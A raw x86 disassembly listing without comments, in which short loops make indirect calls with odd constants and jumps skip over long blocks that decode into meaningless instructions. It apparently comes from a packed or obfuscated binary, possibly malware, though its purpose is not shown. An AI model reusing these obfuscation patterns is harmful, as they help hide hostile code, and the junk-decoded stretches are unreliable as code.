  40a234:	clc    
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fd6d,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fd6d
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fd6d,edx
  40a263:	cmp    DWORD PTR ds:0x42fd6d,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fd6d,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e367
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e1a8,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e78f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	pop    ebx
  40a2c5:	cmc    
  40a2c6:	dec    ebp
  40a2c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2c8:	inc    ebp
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a317
  40a2d1:	jl     0x40a347
  40a2d3:	jle    0x40a31e
  40a2d5:	neg    BYTE PTR [edi+eiz*2-0x3aa1789e]
  40a2dc:	mov    edx,0xa59f58d1
  40a2e1:	jle    0x40a27c
  40a2e3:	add    DWORD PTR [esi+ebp*1-0x50],esi
  40a2e7:	iret   
  40a2e8:	sbb    bl,BYTE PTR ds:0xf069e78d
  40a2ee:	es cmp ecx,ebx
  40a2f1:	lea    eax,[esp+ebp*2-0x5f]
  40a2f5:	rcl    ecx,0x49
  40a2f8:	jno    0x40a367
  40a2fa:	mov    dh,0x1c
  40a2fc:	pop    edx
  40a2fd:	cli    
  40a2fe:	(bad)  
  40a2ff:	mov    eax,ds:0x1d9caf40
  40a304:	je     0x40a357
  40a306:	push   ds
  40a307:	clc    
  40a308:	in     eax,dx
  40a309:	mov    eax,ds:0x7ad77969
  40a30e:	repnz aad 0x73
  40a311:	push   ebp
  40a312:	sub    BYTE PTR [ecx],bl
  40a314:	sub    eax,0x2dc72dd6
  40a319:	jp     0x40a2dd
  40a31b:	dec    ebx
  40a31c:	in     al,dx
  40a31d:	push   0xf444d08b
  40a322:	mov    ebx,0x1da63a13
  40a327:	xchg   ecx,eax
  40a328:	(bad)  
  40a329:	clc    
  40a32a:	fstp   TBYTE PTR [ebx+0x2fc2aa5]
  40a330:	ret    
  40a331:	push   ds
  40a332:	rcl    BYTE PTR [ecx-0x53],cl
  40a335:	gs adc al,0x96
  40a338:	out    dx,al
  40a339:	push   eax
  40a33a:	jmp    0xf904:0x4b66c2b4
  40a341:	mov    bl,0x8f
  40a343:	sbb    bh,cl
  40a345:	test   DWORD PTR [esi-0x65],eax
  40a348:	adc    ah,BYTE PTR [ebx-0x6a]
  40a34b:	loope  0x40a39e
  40a34d:	or     BYTE PTR [ecx-0x7b],0xac
  40a351:	imul   ebx,DWORD PTR [edi+esi*2-0x2b10ab8b],0x5c
  40a359:	pop    esi
  40a35a:	in     eax,0xbf
  40a35c:	dec    edx
  40a35d:	in     eax,0xe2
  40a35f:	retf   0xb56a
  40a362:	push   esp
  40a363:	popa   
  40a364:	xchg   ebx,eax
  40a365:	mov    dh,0xe4
  40a367:	call   0x8acd:0x6ff3398b
  40a36e:	std    
  40a36f:	loopne 0x40a3b5
  40a371:	mov    esp,0x91b15ffe
  40a376:	sahf   
  40a377:	cmp    eax,0xaee46aed
  40a37c:	push   es
  40a37d:	adc    al,0x16
  40a37f:	mov    edi,0x5bb50a76
  40a384:	enter  0x4f96,0xfa
  40a388:	mov    bh,BYTE PTR ds:0x2a33d475
  40a38e:	mov    eax,ds:0xd50a5941
  40a393:	inc    ecx
  40a394:	adc    BYTE PTR [esi-0x17c7b449],dh
  40a39a:	clc    
  40a39b:	inc    eax
  40a39c:	jg     0x40a414
  40a39e:	ds jecxz 0x40a366
  40a3a1:	ret    
  40a3a2:	lock jne 0x40a408
  40a3a5:	imul   BYTE PTR [edx+0x782ff600]
  40a3ab:	cmp    DWORD PTR [ebx],ebp
  40a3ad:	dec    ecx
  40a3ae:	repz lahf 
  40a3b0:	inc    esp
  40a3b2:	pop    ebx
  40a3b3:	sbb    eax,0xe2f7ab7c
  40a3b8:	arpl   WORD PTR ds:0x9d0562c1,sp
  40a3be:	jmp    0xe9f7afbb
  40a3c3:	mov    ds:0xbfa6bb67,eax
  40a3c8:	stc    
  40a3c9:	dec    ecx
  40a3ca:	jb     0x40a3c8
  40a3cc:	fisubr WORD PTR [ebp-0x12caeb13]
  40a3d2:	pop    ss
  40a3d3:	jmp    0x5b39:0x349da82d
  40a3da:	das    
  40a3db:	sbb    DWORD PTR [edi-0x224da9c4],edi
  40a3e1:	sar    BYTE PTR [ebp+0x1233544d],cl
  40a3e7:	sbb    ebp,0x95361998
  40a3ed:	test   eax,0x8fb39742
  40a3f2:	out    dx,al
  40a3f3:	ins    BYTE PTR es:[edi],dx
  40a3f4:	fnsave [eax+0x6380e463]
  40a3fa:	sbb    eax,0x18416278
  40a3ff:	out    0x52,eax
  40a401:	mov    eax,ds:0x5e5bc7bc
  40a406:	sahf   
  40a407:	std    
  40a408:	and    DWORD PTR [ebx],esp
  40a40a:	scas   eax,DWORD PTR es:[edi]
  40a40b:	std    
  40a40c:	ins    BYTE PTR es:[edi],dx
  40a40d:	mov    ds:0xddc601b9,eax
  40a412:	pop    eax
  40a413:	loop   0x40a3a1
  40a415:	in     eax,dx
  40a416:	mov    ecx,0x98dfb371
  40a41b:	cdq    
  40a41c:	add    al,0xcf
  40a41e:	pop    ds
  40a41f:	addr16 clc 
  40a421:	xchg   edx,eax
  40a422:	push   eax
  40a423:	fdivr  st,st(4)
  40a425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a426:	cmc    
  40a427:	mov    esp,0xfc33e6b
  40a42c:	mulps  xmm4,xmm6
  40a42f:	push   ecx
  40a430:	scas   al,BYTE PTR es:[edi]
  40a431:	sbb    al,ch
  40a433:	cmp    dh,BYTE PTR [ebp-0xc]
  40a436:	movaps XMMWORD PTR [ebp+0x64e35afb],xmm2
  40a43d:	scas   eax,DWORD PTR es:[edi]
  40a43e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a43f:	push   es
  40a440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a441:	add    al,0x6b
  40a443:	dec    eax
  40a444:	jb     0x40a440
  40a446:	fisub  WORD PTR [ebp-0x80]
  40a449:	jnp    0x40a48f
  40a44b:	adc    bl,ch
  40a44d:	rol    BYTE PTR [ecx+esi*4],cl
  40a450:	pop    edi
  40a451:	sbb    bh,BYTE PTR [edx-0x28]
  40a454:	(bad)  
  40a455:	imul   bl
  40a457:	mov    cl,0xa8
  40a459:	xchg   esp,eax
  40a45a:	push   esi
  40a45b:	and    DWORD PTR [edi+0x5db2ee31],edi
  40a461:	mov    ebx,ebx
  40a463:	pop    esi
  40a464:	adc    DWORD PTR [edi+0x1a],ecx
  40a467:	das    
  40a468:	xlat   BYTE PTR ds:[ebx]
  40a469:	es mov bh,0xfc
  40a46c:	das    
  40a46d:	pop    ds
  40a46e:	xor    BYTE PTR [esi-0x38],al
  40a471:	outs   dx,BYTE PTR ds:[esi]
  40a472:	arpl   WORD PTR [eax-0x5b42177d],bp
  40a478:	ins    DWORD PTR es:[edi],dx
  40a479:	into   
  40a47a:	test   eax,0x3d496a0f
  40a47f:	mov    dh,0xb3
  40a481:	xor    BYTE PTR [edi-0x5e],ch
  40a484:	jns    0x40a49c
  40a486:	inc    ecx
  40a487:	mov    esi,0xe2237f23
  40a48c:	bound  esi,QWORD PTR [ecx]
  40a48e:	adc    eax,0x81c30012
  40a493:	inc    esp
  40a494:	(bad)  
  40a495:	jnp    0x40a4c7
  40a497:	push   ss
  40a498:	int    0x6b
  40a49a:	jb     0x40a442
  40a49c:	les    ebp,FWORD PTR [esp+edx*1-0x4]
  40a4a0:	aam    0xe5
  40a4a2:	(bad)  
  40a4a3:	popa   
  40a4a4:	js     0x40a49a
  40a4a6:	cmp    eax,0xf5c77a4c
  40a4ab:	inc    eax
  40a4ac:	std    
  40a4ad:	test   al,0x41
  40a4af:	iret   
  40a4b0:	pop    edx
  40a4b1:	std    
  40a4b2:	sub    BYTE PTR [ebx+0x44d0c71f],bl
  40a4b8:	jge    0x40a47d
  40a4ba:	iret   
  40a4bb:	sbb    eax,0x11adb876
  40a4c0:	into   
  40a4c1:	test   al,0xfa
  40a4c3:	dec    ebp
  40a4c4:	cwde   
  40a4c5:	mov    ds:0x2932a974,al
  40a4ca:	inc    ebx
  40a4cb:	hlt    
  40a4cc:	xor    eax,0xc8f6fb32
  40a4d1:	add    bh,bl
  40a4d3:	out    0xb5,eax
  40a4d5:	jecxz  0x40a4fb
  40a4d7:	jmp    0x9470:0x58d49fab
  40a4de:	shr    WORD PTR [eax-0x18415d11],0x54
  40a4e6:	mov    ebx,0x61bc8477
  40a4eb:	mov    ebp,0x7c9228f5
  40a4f0:	stos   DWORD PTR es:[edi],eax
  40a4f1:	fwait
  40a4f2:	(bad)  
  40a4f3:	and    ebp,DWORD PTR [ebp-0x2b]
  40a4f6:	stc    
  40a4f7:	mov    edx,0xb8172039
  40a4fc:	adc    cl,BYTE PTR [ebx-0x7d]
  40a4ff:	int    0x69
  40a501:	jl     0x40a4da
  40a503:	push   cs
  40a504:	dec    edi
  40a505:	add    BYTE PTR [ecx+0x19ce964],al
  40a50b:	dec    edx
  40a50c:	mov    bh,0xb4
  40a50e:	sbb    BYTE PTR [edx-0x46],ch
  40a511:	add    dh,BYTE PTR [edi-0xfd67733]
  40a517:	sbb    ch,ah
  40a519:	es shr bh,0xbe
  40a51d:	out    dx,eax
  40a51e:	sub    al,0x6f
  40a520:	xchg   DWORD PTR [ebp+0x324d825b],edx
  40a526:	or     eax,0x545c5967
  40a52b:	scas   eax,DWORD PTR es:[edi]
  40a52c:	mov    ah,0xd4
  40a52e:	sub    eax,0x142f027b
  40a533:	jl     0x40a501
  40a535:	iret   
  40a536:	push   ebp
  40a537:	inc    edi
  40a538:	inc    ebx
  40a539:	adc    cl,BYTE PTR [esi]
  40a53b:	inc    edi
  40a53c:	fld    DWORD PTR [ebp-0x46c147e2]
  40a542:	add    ecx,ecx
  40a544:	aad    0x2e
  40a546:	sub    eax,0x1cad3636
  40a54b:	inc    esi
  40a54c:	adc    ch,BYTE PTR [ebp+0x3bf14aa1]
  40a552:	stos   BYTE PTR es:[edi],al
  40a553:	or     al,0x0
  40a555:	push   ss
  40a556:	adc    eax,0xbb44ebb
  40a55b:	neg    bl
  40a55d:	xchg   edx,eax
  40a55e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a55f:	and    eax,0xf253d241
  40a564:	inc    edx
  40a565:	mov    dl,0x3
  40a567:	lods   eax,DWORD PTR ds:[esi]
  40a568:	or     eax,0x62b9afea
  40a56d:	ror    BYTE PTR [eax+0x661a655a],0x5
  40a574:	in     eax,0xdd
  40a576:	add    al,0x82
  40a578:	mov    bl,0x4b
  40a57a:	mov    dl,0xd5
  40a57c:	lahf   
  40a57d:	mov    edi,0x1b87d4ee
  40a582:	mov    ds:0x99bce69,al
  40a587:	inc    ebp
  40a588:	or     eax,0x318ba37b
  40a58d:	mov    ebp,0x718b912e
  40a592:	pop    ebp
  40a593:	outs   dx,DWORD PTR ds:[esi]
  40a594:	xor    eax,0xaed3c11
  40a599:	out    dx,al
  40a59a:	mov    bh,0x91
  40a59c:	jae    0x40a560
  40a59e:	add    DWORD PTR [eax-0x300f50b2],esi
  40a5a4:	mov    al,ds:0x67744b4e
  40a5a9:	test   DWORD PTR [edx-0x64c849d9],edx
  40a5af:	loop   0x40a562
  40a5b1:	xchg   BYTE PTR cs:[ebp-0x7],dh
  40a5b5:	dec    ebx
  40a5b6:	cli    
  40a5b7:	jle    0x40a582
  40a5b9:	jp     0x40a5f7
  40a5bb:	(bad)  
  40a5bc:	sar    BYTE PTR [ebx+0x27],cl
  40a5bf:	add    bh,BYTE PTR [esi]
  40a5c1:	jmp    0xbf3a242f
  40a5c6:	mov    ah,0x79
  40a5c8:	fs xchg ecx,edi
  40a5cb:	addr16 dec esi
  40a5cd:	xlat   BYTE PTR ds:[ebx]
  40a5ce:	mov    esp,0x6bd89b51
  40a5d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5d4:	and    cl,dh
  40a5d6:	sub    eax,0x6da45861
  40a5db:	into   
  40a5dc:	dec    edi
  40a5dd:	mov    dh,0x40
  40a5df:	add    DWORD PTR [edi-0x11],ecx
  40a5e2:	xor    al,0xa8
  40a5e4:	enter  0xca5,0xa5
  40a5e8:	inc    eax
  40a5e9:	sbb    BYTE PTR [edi-0x2f],0xac
  40a5ed:	scas   al,BYTE PTR es:[edi]
  40a5ee:	div    bh
  40a5f0:	mov    eax,ds:0x94d885b4
  40a5f5:	les    edi,FWORD PTR [ebx]
  40a5f7:	stos   DWORD PTR es:[edi],eax
  40a5f8:	xlat   BYTE PTR ds:[ebx]
  40a5f9:	xchg   DWORD PTR [ecx+0x4f],ebp
  40a5fc:	mov    edi,0x9dcf7f55
  40a601:	or     al,0x68
  40a603:	xchg   ebp,eax
  40a604:	les    ebx,FWORD PTR [esi-0x6c8e37c9]
  40a60a:	mov    al,0xf
  40a60c:	inc    ebx
  40a60d:	xor    BYTE PTR [esi+0x7d226de1],bh
  40a613:	imul   eax,eax,0x456bb5c9
  40a619:	sub    edx,0xffffff9d
  40a61c:	loope  0x40a63e
  40a61e:	adc    esi,0xffffffb1
  40a621:	dec    edi
  40a622:	or     eax,0xa9d67e81
  40a627:	jbe    0x40a5e0
  40a629:	aas    
  40a62a:	iret   
  40a62b:	mov    cl,0xbe
  40a62d:	pop    esi
  40a62e:	sub    bh,BYTE PTR [edi]
  40a630:	loop   0x40a64f
  40a632:	xchg   esp,eax
  40a633:	inc    ebp
  40a634:	or     al,0xd
  40a636:	dec    ebx
  40a637:	pop    esp
  40a638:	or     BYTE PTR [edx-0x32],dl
  40a63b:	or     esi,DWORD PTR [ecx+0x10f487d4]
  40a641:	in     al,dx
  40a642:	iret   
  40a643:	mov    BYTE PTR [esi+edi*8-0x46],ah
  40a647:	shl    BYTE PTR [edx+esi*4],1
  40a64a:	sub    cl,BYTE PTR [ecx-0x5c]
  40a64d:	cmp    DWORD PTR [ebp+0x11],esi
  40a650:	nop
  40a651:	sub    eax,0xf551e3c2
  40a656:	or     al,0xe2
  40a658:	or     DWORD PTR [ebp+0x2f],eax
  40a65b:	mov    ebx,0x4f3e01ef
  40a660:	jl     0x40a6ae
  40a662:	leave  
  40a663:	push   ss
  40a664:	mov    ecx,0x56b6064e
  40a669:	pop    ss
  40a66a:	jne    0x40a69a
  40a66c:	int3   
  40a66d:	test   BYTE PTR [esi],0xd
  40a670:	xchg   esi,eax
  40a671:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e76f,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e76f
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e76f,edx
  40a698:	cmp    DWORD PTR ds:0x42e76f,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e777
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e36b
  40a6c6:	cmp    DWORD PTR ds:0x42e76f,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e76f
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e76f,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e76f,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fd5d,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fd5d
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fd5d,edx
  40a709:	cmp    DWORD PTR ds:0x42fd5d,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fd5d,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e2ed
  40a728:	push   0x42e2db
  40a72d:	call   DWORD PTR ds:0x42e5c7
  40a733:	cmp    DWORD PTR ds:0x42fd5d,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fd5d
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fd5d,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e1b4
  40a75a:	xor    edi,DWORD PTR ds:0x42e793
  40a760:	mov    DWORD PTR ds:0x42e1b4,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e793,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fd51
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fd65,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e793,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fd79,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd89,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e1b0,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e1b0,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e1b0,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e267
  40a7e8:	push   0x42e2bd
  40a7ed:	push   0x42e2bd
  40a7f2:	call   DWORD PTR ds:0x42e36f
  40a7f8:	cmp    DWORD PTR ds:0x42e1b0,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e1b0
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e1b0,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e1b0
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e1b0,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e1ac,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fdee
  40a839:	add    DWORD PTR ds:0x42e787,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	dec    ebx
  40a854:	fadd   st(5),st
  40a856:	xchg   esp,esp
  40a858:	icebp  
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a895
  40a860:	(bad)
  40a864:	fsubr  DWORD PTR [edx-0x3]
  40a867:	sbb    al,0x5d
  40a869:	in     al,dx
  40a86a:	mov    al,0x33
  40a86c:	add    al,BYTE PTR [edx+0x76cd26a]
  40a872:	add    bh,0x8
  40a875:	and    dh,BYTE PTR [bx+si+0x9f7]
  40a87a:	adc    esi,DWORD PTR [esi-0x1f914e40]
  40a880:	retf   0xabf8
  40a883:	sub    al,ah
  40a885:	adc    bh,cl
  40a887:	out    dx,al
  40a888:	cmp    BYTE PTR [eax+0x2b],dh
  40a88b:	mov    bl,0x25
  40a88d:	push   ebp
  40a88e:	dec    edi
  40a88f:	dec    ebx
  40a890:	xchg   edx,eax
  40a891:	push   edx
  40a892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a893:	call   0x1a6f227c
  40a898:	ds int 0x89
  40a89b:	dec    esp
  40a89c:	cmp    cl,bl
  40a89e:	cmp    DWORD PTR [ebp-0x60],0xffffffec
  40a8a2:	or     ebp,esp
  40a8a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8a5:	popa   
  40a8a6:	icebp  
  40a8a7:	nop
  40a8a8:	fsubr  st(1),st
  40a8aa:	fadd   QWORD PTR [esi+ebp*8]
  40a8ad:	in     eax,dx
  40a8ae:	mov    ebp,0x9c15ffe1
  40a8b3:	lods   al,BYTE PTR ds:[esi]
  40a8b4:	bound  eax,QWORD PTR [eax+0x79b7f34d]
  40a8ba:	ins    DWORD PTR es:[edi],dx
  40a8bb:	mov    bl,bh
  40a8bd:	(bad)  
  40a8be:	sbb    esi,DWORD PTR [edi+0x1a]
  40a8c1:	pop    ebp
  40a8c2:	dec    edi
  40a8c3:	inc    esp
  40a8c4:	inc    esp
  40a8c5:	aad    0x1c
  40a8c7:	mov    eax,0xb1c397b4
  40a8cc:	jb     0x40a92d
  40a8ce:	mov    ch,0xbc
  40a8d0:	int3   
  40a8d1:	sub    BYTE PTR [ebp-0x19],dl
  40a8d4:	add    edi,ecx
  40a8d6:	arpl   WORD PTR [ecx],bp
  40a8d8:	mov    ds:0x59662455,eax
  40a8dd:	jle    0x40a94c
  40a8df:	std    
  40a8e0:	sub    edx,DWORD PTR [esi+0x6989fef8]
  40a8e6:	lahf   
  40a8e7:	mov    edi,DWORD PTR [ecx-0x47]
  40a8ea:	je     0x40a8b8
  40a8ec:	or     eax,0x43d3e8ba
  40a8f1:	fbld   TBYTE PTR [eax+0x2827c154]
  40a8f7:	int    0x1c
  40a8f9:	ins    BYTE PTR es:[edi],dx
  40a8fa:	out    dx,al
  40a8fb:	dec    ebp
  40a8fc:	jle    0x40a899
  40a8fe:	in     eax,0x9e
  40a900:	adc    DWORD PTR [ecx-0x131f0d3b],eax
  40a906:	sbb    BYTE PTR [edi-0x1e],dh
  40a909:	or     eax,0xfd85005c
  40a90e:	pop    esi
  40a90f:	xlat   BYTE PTR ds:[ebx]
  40a910:	pop    ecx
  40a911:	jns    0x40a8dd
  40a913:	fcmovnbe st,st(6)
  40a915:	mov    cl,al
  40a917:	mov    ds:0x1159fd02,al
  40a91c:	pop    ebx
  40a91d:	fs into 
  40a91f:	cmp    dl,BYTE PTR [eax-0x45]
  40a922:	push   ss
  40a923:	test   DWORD PTR [eax],edx
  40a925:	mov    esi,edx
  40a927:	(bad)  
  40a928:	sub    al,BYTE PTR [edx+0x43]
  40a92b:	cdq    
  40a92c:	gs mov al,0x69
  40a92f:	bound  esi,QWORD PTR [eiz*8-0x6fbfd8f5]
  40a936:	pusha  
  40a937:	(bad)  
  40a938:	sbb    al,0x34
  40a93a:	xor    eax,0x50c10d07
  40a93f:	xchg   esp,eax
  40a940:	test   eax,0x7681fa64
  40a945:	in     al,0x20
  40a947:	jb     0x40a8dc
  40a949:	fistp  DWORD PTR [eax-0x7505fb69]
  40a94f:	into   
  40a950:	fistp  WORD PTR [ebp+0x4ea8ce17]
  40a956:	sbb    al,0x7b
  40a958:	call   0xbbe99037
  40a95d:	in     al,dx
  40a95e:	jge    0x40a9ad
  40a960:	repz cwde 
  40a962:	pop    eax
  40a963:	lock mov fs,WORD PTR [ebx-0x44]
  40a967:	xchg   ebp,eax
  40a968:	sahf   
  40a969:	cmp    BYTE PTR [ebx+0x6e],al
  40a96c:	sbb    BYTE PTR [ebp+0x427772e9],0x96
  40a973:	in     al,0x66
  40a975:	pusha  
  40a976:	jmp    0x40a9c7
  40a978:	ins    BYTE PTR es:[edi],dx
  40a979:	int    0xf6
  40a97b:	popf   
  40a97c:	imul   ebp,DWORD PTR [ecx-0x5d1ff3f7],0x77
  40a983:	cwde   
  40a984:	dec    esp
  40a985:	out    dx,eax
  40a986:	aaa    
  40a987:	add    al,0x1
  40a989:	or     DWORD PTR [ebx+0x4c7799aa],ebx
  40a98f:	fwait
  40a990:	pop    edx
  40a991:	test   al,0x85
  40a993:	les    edx,FWORD PTR [edi+0xb]
  40a996:	lea    ebx,[eax]
  40a998:	int3   
  40a999:	cwde   
  40a99a:	fisubr WORD PTR [ebx+eax*4+0x27]
  40a99e:	in     al,dx
  40a99f:	in     al,0x66
  40a9a1:	xchg   BYTE PTR [esi+0x5b],bh
  40a9a4:	pop    edx
  40a9a5:	jne    0x40a9a9
  40a9a7:	fidivr DWORD PTR [eax+eax*1+0x1]
  40a9ab:	outs   dx,DWORD PTR ds:[esi]
  40a9ac:	sahf   
  40a9ad:	shl    BYTE PTR [eax+0x64aaf0e8],1
  40a9b3:	mov    bl,0x99
  40a9b5:	add    eax,0xeca15e96
  40a9ba:	sar    ecx,0x2
  40a9bd:	pop    ss
  40a9be:	adc    BYTE PTR [ebx+0x59907cc9],0x51
  40a9c5:	int    0x2b
  40a9c7:	mov    bh,0x23
  40a9c9:	ret    0x475a
  40a9cc:	xor    DWORD PTR [ebp-0x80774db],edx
  40a9d2:	mov    esi,0xd7cccc69
  40a9d7:	sub    esp,esp
  40a9d9:	cwde   
  40a9da:	cwde   
  40a9db:	jb     0x40aa1a
  40a9dd:	mov    ds:0xfcca08c1,al
  40a9e2:	ret    0x62bc
  40a9e5:	adc    al,0x8f
  40a9e7:	and    DWORD PTR [ebp-0x6],edx
  40a9ea:	outs   dx,DWORD PTR ds:[esi]
  40a9eb:	add    bl,0x55
  40a9ee:	inc    edx
  40a9ef:	xor    DWORD PTR [edx+0x37f103f7],eax
  40a9f5:	mov    es,eax
  40a9f7:	mov    edx,0x6f0b41e6
  40a9fc:	data16 (bad) 
  40a9fe:	pop    ecx
  40a9ff:	sub    eax,0xf701eb9f
  40aa04:	jb     0x40aa67
  40aa06:	xor    al,0x18
  40aa08:	retf   
  40aa09:	(bad)  
  40aa0a:	ja     0x40aa43
  40aa0c:	mov    ds:0x5ea6df38,eax
  40aa11:	xchg   esi,eax
  40aa12:	test   BYTE PTR [eax],0xa4
  40aa15:	jecxz  0x40a9ca
  40aa17:	or     al,0x79
  40aa19:	mov    dl,0x15
  40aa1b:	xor    DWORD PTR [eax-0x6],esp
  40aa1e:	mov    ds:0x340bdbf7,al
  40aa23:	hlt    
  40aa24:	inc    edi
  40aa25:	dec    ebx
  40aa26:	cmp    eax,0x9097bd3e
  40aa2b:	jl     0x40aa81
  40aa2d:	pop    edx
  40aa2e:	test   DWORD PTR [esi-0x39d783b5],edi
  40aa34:	sub    al,0xb0
  40aa36:	(bad)  
  40aa37:	xchg   ebp,eax
  40aa38:	pop    ss
  40aa39:	mov    ch,0x22
  40aa3b:	inc    esp
  40aa3c:	cdq    
  40aa3d:	xchg   edi,eax
  40aa3e:	cmp    ah,ah
  40aa40:	lods   eax,DWORD PTR ds:[esi]
  40aa41:	add    ch,BYTE PTR [ecx-0x63177cf3]
  40aa47:	jg     0x40aa7f
  40aa49:	aad    0xbf
  40aa4b:	int    0xc3
  40aa4d:	sbb    esi,DWORD PTR [edi]
  40aa4f:	mov    ds:0xff1efbad,eax
  40aa54:	mov    dh,0x3d
  40aa56:	and    BYTE PTR [ebx],al
  40aa58:	push   edx
  40aa59:	cdq    
  40aa5a:	test   ch,al
  40aa5c:	xchg   esi,eax
  40aa5d:	mov    eax,ds:0x60b10fb3
  40aa62:	popa   
  40aa63:	push   esp
  40aa64:	aas    
  40aa65:	sbb    al,0xb
  40aa67:	das    
  40aa68:	retf   
  40aa69:	mov    bh,BYTE PTR [ebp-0x7c]
  40aa6c:	sub    al,0xbc
  40aa6e:	push   eax
  40aa6f:	add    BYTE PTR [edx+edx*4-0x43],0xdc
  40aa74:	pop    ebx
  40aa75:	mov    ecx,DWORD PTR [ebx-0x6d6fec7c]
  40aa7b:	jmp    0xb3fdca5b
  40aa80:	in     al,dx
  40aa81:	stos   DWORD PTR es:[edi],eax
  40aa82:	sub    al,0xfa
  40aa84:	out    0x9b,eax
  40aa86:	pop    ebp
  40aa87:	lds    eax,FWORD PTR [edi]
  40aa89:	or     BYTE PTR [ebx],bh
  40aa8b:	mov    DWORD PTR [ebx+0x70],esi
  40aa8e:	sub    al,0x74
  40aa90:	inc    esp
  40aa91:	sbb    BYTE PTR [ecx],ch
  40aa93:	enter  0xf1bd,0x38
  40aa97:	mov    dl,0xd2
  40aa99:	(bad)  
  40aa9a:	rcl    DWORD PTR [esi+0x7648e388],1
  40aaa0:	pop    ss
  40aaa1:	xlat   BYTE PTR ds:[ebx]
  40aaa2:	inc    eax
  40aaa3:	mov    ?,WORD PTR [ecx]
  40aaa5:	(bad)  
  40aaa7:	push   ebp
  40aaa8:	push   edx
  40aaa9:	or     ah,cl
